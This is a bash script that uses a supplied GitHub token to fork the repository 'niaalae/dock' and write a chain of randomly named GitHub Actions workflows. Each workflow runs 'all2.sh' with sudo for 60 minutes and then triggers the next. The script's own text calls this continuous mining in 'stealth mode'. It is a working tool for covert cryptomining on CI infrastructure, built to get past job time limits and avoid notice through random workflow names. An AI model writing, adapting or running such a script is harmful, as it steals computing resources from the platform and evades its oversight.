#!/bin/bash
# Usage: bash run_relay_task.sh <GITHUB_TOKEN> <COUNT>
# Relay race style: Each task runs 60min, stops, triggers next

set -e

if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <GITHUB_TOKEN> <COUNT>"
  echo "Example: $0 ghp_xxx 20  # 20 hours of continuous mining"
  exit 1
fi

GITHUB_TOKEN="$1"
COUNT="$2"
SOURCE_REPO="niaalae/dock"

if ! [[ "$COUNT" =~ ^[0-9]+$ ]]; then
  echo "Error: COUNT must be a number"
  exit 1
fi

if [ "$COUNT" -lt 1 ] || [ "$COUNT" -gt 100 ]; then
  echo "Error: COUNT must be between 1 and 100"
  exit 1
fi

export GH_TOKEN="$GITHUB_TOKEN"

FORK_OWNER=$(gh api user --jq '.login')
if [ -z "$FORK_OWNER" ]; then
  echo "ERROR: Failed to authenticate"
  exit 1
fi

echo "Authenticated as: $FORK_OWNER"

FORK_REPO="$FORK_OWNER/dock"
echo "Checking if fork exists: $FORK_REPO"

if gh api "repos/$FORK_REPO" --jq '.full_name' 2>/dev/null | grep -q "$FORK_OWNER"; then
  echo "Fork already exists."
else
  echo "Creating fork..."
  gh api \
    --method POST \
    -H "Accept: application/vnd.github+json" \
    -H "X-GitHub-Api-Version: 2022-11-28" \
    "/repos/$SOURCE_REPO/forks" \
    --jq '.full_name'
  
  for i in {1..15}; do
    if gh api "repos/$FORK_REPO" --jq '.full_name' 2>/dev/null | grep -q "$FORK_OWNER"; then
      echo "Fork is ready!"
      break
    fi
    sleep 3
  done
fi

echo ""
echo "=========================================="
echo "Creating $COUNT RELAY TASKS..."
echo "Each runs 60min -> stops -> triggers next"
echo "Total runtime: ${COUNT} hours"
echo "=========================================="
echo ""

# Generate workflow names
declare -a WORKFLOW_NAMES
for i in $(seq 1 $COUNT); do
  RANDOM_SUFFIX=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
  WORKFLOW_NAMES[$i]="relay_${RANDOM_SUFFIX}.yml"
done

# Function to create relay miner workflow
create_relay_task() {
  local current_num=$1
  local total=$2
  local next_workflow_name=$3
  local fork_repo=$4

  local trigger_step=""
  if [ "$current_num" -lt "$total" ]; then
    trigger_step="
      - name: TRIGGER NEXT TASK (${current_num} -> ${total})
        env:
          GH_TOKEN: \\${{ secrets.GITHUB_TOKEN }}
        run: |
          echo \"[Relay ${current_num}/${total}] This task finished after 60 minutes\"
          echo \"[Relay ${current_num}/${total}] Triggering next task: ${next_workflow_name}\"
          gh workflow run \"${next_workflow_name}\" --repo ${fork_repo}
          echo \"[Relay ${current_num}/${total}] Next task triggered!\"
    "
  fi

  local content="name: Relay Task ${current_num}/${total}

on:
  workflow_dispatch:

jobs:
  relay-job:
    runs-on: ubuntu-latest
    timeout-minutes: 65  # Safety timeout
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Start Relay Task ${current_num}
        run: |
          echo \"========================================\"
          echo \"RELAY TASK ${current_num}/${total} STARTED\"
          echo \"Time: $(date)\"
          echo \"Will run for exactly 60 minutes\"
          echo \"========================================\"

      - name: RUN TASK for 60 minutes
        run: |
          echo \"Starting all2.sh in background...\"
          sudo bash ./all2.sh &
          TASK_PID=$!
          echo \"Task PID: $TASK_PID\"
          echo \"Running for 60 minutes...\"
          for i in {1..60}; do
            echo \"Minute $i/60 - still running...\"
            sleep 60
          done
          echo \"60 minutes completed! Stopping task...\"
          kill $TASK_PID 2>/dev/null || true
          sudo pkill -f all2.sh 2>/dev/null || true
          echo \"Task stopped!\"

      - name: Commit progress
        run: |
          echo \"relay-${current_num}-completed-$(date +%s)\" >> relay.log
          git add relay.log 2>/dev/null || true
          git config --global user.email \"relay@github.com\" 2>/dev/null || true
          git config --global user.name \"Relay Bot\" 2>/dev/null || true
          git commit -m \"relay: task ${current_num} completed\" 2>/dev/null || true
          git push 2>/dev/null || true
        continue-on-error: true
${trigger_step}      - name: Relay Complete
        run: |
          echo \"========================================\"
          echo \"RELAY TASK ${current_num} COMPLETE\"
          echo \"Time: $(date)\"
          echo \"========================================\"
  "
  echo "$content" | base64 -w 0
}

# Create all workflow files
echo "Creating relay task workflows..."
for i in $(seq 1 $COUNT); do
  WORKFLOW_NAME="${WORKFLOW_NAMES[$i]}"
  WORKFLOW_PATH=".github/workflows/$WORKFLOW_NAME"
  
  NEXT_WORKFLOW=""
  if [ "$i" -lt "$COUNT" ]; then
    NEXT_WORKFLOW="${WORKFLOW_NAMES[$((i+1))]}"
  fi
  
  echo "[$i/$COUNT] Creating $WORKFLOW_NAME -> ${NEXT_WORKFLOW:-'(FINAL)'}"
  
  WORKFLOW_CONTENT=$(create_relay_task "$i" "$COUNT" "$NEXT_WORKFLOW" "$FORK_REPO")
  
  gh api \
    --method PUT \
    -H "Accept: application/vnd.github+json" \
    -H "X-GitHub-Api-Version: 2022-11-28" \
    "/repos/$FORK_REPO/contents/$WORKFLOW_PATH" \
    -f message="Add relay task $i/$COUNT" \
    -f content="$WORKFLOW_CONTENT" > /dev/null 2>&1
  
  if [ $? -eq 0 ]; then
    echo "[$i/$COUNT] ✓ Created"
  else
    echo "[$i/$COUNT] ✗ Failed"
  fi
  
  sleep 1
done

echo ""
echo "All relay tasks created!"
echo ""

# Trigger first workflow
echo "=========================================="
echo "STARTING RELAY CHAIN..."
echo "=========================================="

FIRST_WORKFLOW="${WORKFLOW_NAMES[1]}"
FIRST_PATH=".github/workflows/$FIRST_WORKFLOW"

echo "Waiting for indexing..."
FIRST_ID=""
for i in {1..30}; do
  FIRST_ID=$(gh workflow list --repo "$FORK_REPO" --all --json id,path --jq ".[] | select(.path==\"$FIRST_PATH\") | .id" 2>/dev/null)
  if [ -n "$FIRST_ID" ]; then
    break
  fi
  sleep 5
done

if [ -z "$FIRST_ID" ]; then
  echo "ERROR: First workflow not indexed"
  exit 1
fi

echo "Triggering RELAY 1: $FIRST_WORKFLOW"
gh workflow run "$FIRST_ID" --repo "$FORK_REPO"

sleep 10

RUN_ID=$(gh run list --repo "$FORK_REPO" --workflow "$FIRST_ID" --json databaseId --jq '.[0].databaseId' 2>/dev/null)

echo ""
echo "=========================================="
echo "✓ RELAY CHAIN ACTIVATED!"
echo "=========================================="
echo ""
if [ -n "$RUN_ID" ]; then
  echo "First relay: https://github.com/$FORK_REPO/actions/runs/$RUN_ID"
fi
echo ""
echo "RELAY RACE MODE:"
echo "================"
echo "Hour 1:   Task 1 runs (60 min) -> stops -> triggers Task 2"
echo "Hour 2:   Task 2 runs (60 min) -> stops -> triggers Task 3"
echo "Hour 3:   Task 3 runs (60 min) -> stops -> triggers Task 4"
echo "..."
echo "Hour ${COUNT}: Task ${COUNT} runs (60 min) -> DONE"
echo ""
echo "Total continuous runtime: ${COUNT} hours"
echo "Always 1 task running (stealth mode)"
echo ""
echo "Monitor: https://github.com/$FORK_REPO/actions"
echo ""
echo "Relay Chain:"
for i in $(seq 1 $COUNT); do
  echo "  Hour $i: ${WORKFLOW_NAMES[$i]}"
done